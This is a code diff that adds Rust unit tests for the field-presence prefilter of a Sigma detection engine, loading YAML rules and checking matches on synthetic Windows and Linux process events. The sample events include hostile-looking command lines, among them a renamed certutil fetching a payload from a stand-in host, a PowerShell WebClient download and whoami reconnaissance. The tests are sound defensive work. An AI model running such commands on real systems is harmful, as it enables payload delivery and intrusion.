@@ -3806,4 +3806,329 @@ detection:
             }
         }
     }
+
+    // ═════════════════════════════════════════════════════════════════════
+    // FIELD PRESENCE PREFILTER TESTS — O(1) 64-bit Bitmask Gate
+    // ═════════════════════════════════════════════════════════════════════
+
+    mod field_presence_prefilter_tests {
+        use super::*;
+
+        #[test]
+        fn single_required_field_skips_when_missing() {
+            let yaml = r#"
+title: Single Required Field Rule
+logsource:
+    category: process_creation
+    product: windows
+detection:
+    selection:
+        CommandLine|contains: 'suspicious_payload'
+    condition: selection
+"#;
+            let mut engine = SigmaEngine::new();
+            engine.load_rule(yaml).unwrap();
+
+            // Event missing CommandLine entirely
+            let mut event = HashMap::new();
+            event.insert(
+                "Image".to_string(),
+                "C:\\Windows\\System32\\cmd.exe".to_string(),
+            );
+            event.insert("event_category".to_string(), "process_creation".to_string());
+            event.insert("event_product".to_string(), "windows".to_string());
+
+            let matches = engine.evaluate_event(&event);
+            assert_eq!(matches.len(), 0);
+
+            // Event with CommandLine present and matching
+            event.insert(
+                "CommandLine".to_string(),
+                "cmd.exe suspicious_payload".to_string(),
+            );
+            let matches = engine.evaluate_event(&event);
+            assert_eq!(matches.len(), 1);
+        }
+
+        #[test]
+        fn conjunction_requires_both_fields() {
+            let yaml = r#"
+title: Both Fields Required Rule
+logsource:
+    category: process_creation
+    product: windows
+detection:
+    sel1:
+        Image|endswith: '\powershell.exe'
+    sel2:
+        CommandLine|contains: '-enc'
+    condition: sel1 and sel2
+"#;
+            let mut engine = SigmaEngine::new();
+            engine.load_rule(yaml).unwrap();
+
+            let mut event = HashMap::new();
+            event.insert("event_category".to_string(), "process_creation".to_string());
+            event.insert("event_product".to_string(), "windows".to_string());
+
+            // Has Image but missing CommandLine
+            event.insert(
+                "Image".to_string(),
+                "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe".to_string(),
+            );
+            assert_eq!(engine.evaluate_event(&event).len(), 0);
+
+            // Has CommandLine but missing Image
+            event.remove("Image");
+            event.insert(
+                "CommandLine".to_string(),
+                "powershell.exe -enc abc".to_string(),
+            );
+            assert_eq!(engine.evaluate_event(&event).len(), 0);
+
+            // Has both fields and matches
+            event.insert(
+                "Image".to_string(),
+                "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe".to_string(),
+            );
+            assert_eq!(engine.evaluate_event(&event).len(), 1);
+        }
+
+        #[test]
+        fn disjunction_requires_neither_field_alone() {
+            let yaml = r#"
+title: Disjunction Rule
+logsource:
+    category: process_creation
+    product: windows
+detection:
+    sel_img:
+        Image|endswith: '\powershell.exe'
+    sel_cmd:
+        CommandLine|contains: 'powershell'
+    condition: sel_img or sel_cmd
+"#;
+            let mut engine = SigmaEngine::new();
+            engine.load_rule(yaml).unwrap();
+
+            let mut event = HashMap::new();
+            event.insert("event_category".to_string(), "process_creation".to_string());
+            event.insert("event_product".to_string(), "windows".to_string());
+
+            // Only Image present
+            event.insert("Image".to_string(), "C:\\powershell.exe".to_string());
+            assert_eq!(engine.evaluate_event(&event).len(), 1);
+
+            // Only CommandLine present
+            event.remove("Image");
+            event.insert("CommandLine".to_string(), "powershell -version".to_string());
+            assert_eq!(engine.evaluate_event(&event).len(), 1);
+        }
+
+        #[test]
+        fn negated_condition_not_skipped_when_field_absent() {
+            let yaml = r#"
+title: Negated Condition Rule
+logsource:
+    category: process_creation
+    product: windows
+detection:
+    target:
+        CommandLine|contains: 'rundll32'
+    filter:
+        ParentImage|endswith: '\explorer.exe'
+    condition: target and not filter
+"#;
+            let mut engine = SigmaEngine::new();
+            engine.load_rule(yaml).unwrap();
+
+            let mut event = HashMap::new();
+            event.insert("event_category".to_string(), "process_creation".to_string());
+            event.insert("event_product".to_string(), "windows".to_string());
+            event.insert(
+                "CommandLine".to_string(),
+                "rundll32.exe setup.dll".to_string(),
+            );
+            // Notice: ParentImage is ABSENT from event.
+            // Since filter is negated, missing ParentImage should NOT cause rule skip!
+
+            let matches = engine.evaluate_event(&event);
+            assert_eq!(matches.len(), 1);
+        }
+
+        #[test]
+        fn exists_modifier_false_not_skipped_when_field_absent() {
+            let yaml = r#"
+title: Exists False Rule
+logsource:
+    category: process_creation
+    product: windows
+detection:
+    sel:
+        CommandLine|exists: false
+    condition: sel
+"#;
+            let mut engine = SigmaEngine::new();
+            engine.load_rule(yaml).unwrap();
+
+            let mut event = HashMap::new();
+            event.insert("event_category".to_string(), "process_creation".to_string());
+            event.insert("event_product".to_string(), "windows".to_string());
+            // CommandLine is absent, which is what exists: false checks for!
+            assert_eq!(engine.evaluate_event(&event).len(), 1);
+        }
+
+        #[test]
+        fn discriminator_routing_binary_basenames() {
+            let rule_ps = r#"
+title: Powershell Rule
+logsource:
+    category: process_creation
+    product: windows
+detection:
+    sel:
+        Image|endswith: '\powershell.exe'
+        CommandLine|contains: 'download'
+    condition: sel
+"#;
+            let rule_cmd = r#"
+title: Cmd Rule
+logsource:
+    category: process_creation
+    product: windows
+detection:
+    sel:
+        Image|endswith: '\cmd.exe'
+        CommandLine|contains: 'whoami'
+    condition: sel
+"#;
+            let rule_unconstrained = r#"
+title: Unconstrained Rule
+logsource:
+    category: process_creation
+    product: windows
+detection:
+    sel:
+        CommandLine|contains: 'malicious'
+    condition: sel
+"#;
+            let rule_orig = r#"
+title: OriginalFileName Rule
+logsource:
+    category: process_creation
+    product: windows
+detection:
+    sel:
+        OriginalFileName: 'certutil.exe'
+        CommandLine|contains: 'urlcache'
+    condition: sel
+"#;
+            let rule_multi = r#"
+title: Multi-Binary Rule
+logsource:
+    category: process_creation
+    product: windows
+detection:
+    sel:
+        Image|endswith:
+            - '\powershell.exe'
+            - '\cmd.exe'
+        CommandLine|contains: 'admin'
+    condition: sel
+"#;
+
+            let mut engine = SigmaEngine::new();
+            engine.load_rule(rule_ps).unwrap();
+            engine.load_rule(rule_cmd).unwrap();
+            engine.load_rule(rule_unconstrained).unwrap();
+            engine.load_rule(rule_orig).unwrap();
+            engine.load_rule(rule_multi).unwrap();
+
+            // Event 1: powershell.exe with 'download' -> rule_ps should match, cmd/orig pruned
+            let mut event1 = HashMap::new();
+            event1.insert("event_category".to_string(), "process_creation".to_string());
+            event1.insert("event_product".to_string(), "windows".to_string());
+            event1.insert(
+                "Image".to_string(),
+                r"C:\Windows\System32\WindowsPowerShell\v1.0\PowerShell.EXE".to_string(),
+            );
+            event1.insert(
+                "CommandLine".to_string(),
+                "powershell.exe -Command (New-Object Net.WebClient).download()".to_string(),
+            );
+            let m1 = engine.evaluate_event(&event1);
+            let titles1: Vec<&str> = m1.iter().map(|m| m.rule_title.as_str()).collect();
+            assert_eq!(titles1, vec!["Powershell Rule"]);
+
+            // Event 2: cmd.exe with 'whoami' and 'admin' -> rule_cmd and rule_multi should match
+            let mut event2 = HashMap::new();
+            event2.insert("event_category".to_string(), "process_creation".to_string());
+            event2.insert("event_product".to_string(), "windows".to_string());
+            event2.insert(
+                "Image".to_string(),
+                r"C:\Windows\system32\cmd.exe".to_string(),
+            );
+            event2.insert(
+                "CommandLine".to_string(),
+                "cmd.exe /c whoami /groups admin".to_string(),
+            );
+            let m2 = engine.evaluate_event(&event2);
+            let mut titles2: Vec<&str> = m2.iter().map(|m| m.rule_title.as_str()).collect();
+            titles2.sort_unstable();
+            assert_eq!(titles2, vec!["Cmd Rule", "Multi-Binary Rule"]);
+
+            // Event 3: arbitrary benign binary (e.g. chrome.exe) with 'malicious' -> unconstrained matches
+            let mut event3 = HashMap::new();
+            event3.insert("event_category".to_string(), "process_creation".to_string());
+            event3.insert("event_product".to_string(), "windows".to_string());
+            event3.insert(
+                "Image".to_string(),
+                r"C:\Program Files\Google\Chrome\Application\chrome.exe".to_string(),
+            );
+            event3.insert(
+                "CommandLine".to_string(),
+                "chrome.exe --malicious-flag".to_string(),
+            );
+            let m3 = engine.evaluate_event(&event3);
+            let titles3: Vec<&str> = m3.iter().map(|m| m.rule_title.as_str()).collect();
+            assert_eq!(titles3, vec!["Unconstrained Rule"]);
+
+            // Event 4: renamed binary with OriginalFileName = certutil.exe
+            let mut event4 = HashMap::new();
+            event4.insert("event_category".to_string(), "process_creation".to_string());
+            event4.insert("event_product".to_string(), "windows".to_string());
+            event4.insert("Image".to_string(), r"C:\Temp\evasion.exe".to_string());
+            event4.insert("OriginalFileName".to_string(), "CertUtil.exe".to_string());
+            event4.insert(
+                "CommandLine".to_string(),
+                "evasion.exe -urlcache -split -f http://test.com/payload".to_string(),
+            );
+            let m4 = engine.evaluate_event(&event4);
+            let titles4: Vec<&str> = m4.iter().map(|m| m.rule_title.as_str()).collect();
+            assert_eq!(titles4, vec!["OriginalFileName Rule"]);
+
+            // Event 5: Unix path with forward slash
+            let rule_sh = r#"
+title: Sh Rule
+logsource:
+    category: process_creation
+    product: linux
+detection:
+    sel:
+        Image|endswith: '/sh'
+        CommandLine|contains: 'whoami'
+    condition: sel
+"#;
+            engine.load_rule(rule_sh).unwrap();
+
+            let mut event5 = HashMap::new();
+            event5.insert("event_category".to_string(), "process_creation".to_string());
+            event5.insert("event_product".to_string(), "linux".to_string());
+            event5.insert("Image".to_string(), "/usr/bin/sh".to_string());
+            event5.insert("CommandLine".to_string(), "sh whoami".to_string());
+            let m5 = engine.evaluate_event(&event5);
+            let titles5: Vec<&str> = m5.iter().map(|m| m.rule_title.as_str()).collect();
+            assert_eq!(titles5, vec!["Sh Rule"]);
+        }
+    }
 }
